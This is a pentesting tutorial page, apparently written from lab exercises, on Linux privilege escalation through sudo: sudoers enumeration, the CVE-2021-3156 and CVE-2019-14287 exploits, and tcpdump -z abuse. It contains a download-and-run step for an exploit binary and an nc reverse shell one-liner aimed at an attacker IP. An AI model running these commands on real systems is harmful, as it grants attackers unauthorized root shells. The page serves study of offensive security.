---
title: Sudo Rights Abuse
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - privilege
  - escalation
  - linux
---
# Sudo Rights Abuse

When the `sudo` command is issued, the system will check if the user issuing the command has the appropriate rights, as configured in `/etc/sudoers`. 

Therefore the  `/etc/sudoers` file specifies which users or groups are allowed to run specific programs and with what privileges.

```bash
sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
```

Sometimes we will need to know the user's password to list their `sudo` rights, but any rights entries with the `NOPASSWD` option can be seen without entering a password.

```
sudo -l
```


## Vulnerable sudo version

Find out the version of `sudo`:

```shell-session
sudo -V | head -n1
```

### CVE-2021-3156: hax-me-a-sandwich

This affected the sudo versions:

- 1.8.31 - Ubuntu 20.04
- 1.8.27 - Debian 10
- 1.9.2 - Fedora 33
- and others

Proof of concept: [https://github.com/blasty/CVE-2021-3156](https://github.com/blasty/CVE-2021-3156)

In our attacking machine:

```
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
```

This will generate the file sudo-hax-me-a-sandwich. Now we serve this file from our attacking machine:

```
python3 -m http.server 80
```

From the target machine:

```
wget http://$IPAttackingMachine/sudo-hax-me-a-sandwich
chmod +x sudo-hax-me-a-sandwich
./sudo-hax-me-a-sandwich
```

### CVE-2019-14287: Sudo Policy Bypass

Another vulnerability was found in 2019 that affected all versions below 1.8.28, which allowed privileges to escalate even with a simple command. 

CVE-2019-14287: [https://www.sudo.ws/security/advisories/minus_1_uid/](https://www.sudo.ws/security/advisories/minus_1_uid/)

When sudo is configured to allow a user to run commands as an arbitrary user via the `ALL` keyword in a Runas specification, it is possible to run commands as root by specifying the user ID -1 or 4294967295.

Exploiting the bug requires that the user have sudo privileges that allow them to run commands with an arbitrary user ID.

```bash
sudo -l
```

Output:

```shell-session
Matching Defaults entries for htb-student on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on ubuntu:
    (ALL, !root) /bin/ncdu
```

This means that when we can run the command `/usr/bin/ncdu` as any user, except for the user root.

However, if we run it this way

```
sudo -u#-1 /bin/ncdu
```

The system may fallback to 0, which is the root user id:

```
root:x:0:0:root:/root:/bin/bash
```

After entering into `bin/ncdu` spawn a shell with several methods:

- Entering an exclamation mark: !
- With `/bin/bash -i`


## tcpdump

For instance:

```shell-session
sudo -l
```

Output:
 
```
Matching Defaults entries for sysadm on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sysadm may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/tcpdump
```

By specifying the `-z` flag, an attacker could use `tcpdump` to execute a shell script, gain a reverse shell as the root user or run other privileged commands. 

For example, an attacker could create the shell script `.test` containing a reverse shell:

```shell-session
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IPAttacker 1234 >/tmp/f
```

Then, we set a listener in the attacking machine:

```
nc -lvnp 1234
```

And then, run `tcpdump` as root with the `postrotate-command`.

```shell-session
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

[AppArmor](https://wiki.ubuntu.com/AppArmor) in more recent distributions has predefined the commands used with the `postrotate-command`, effectively preventing command execution.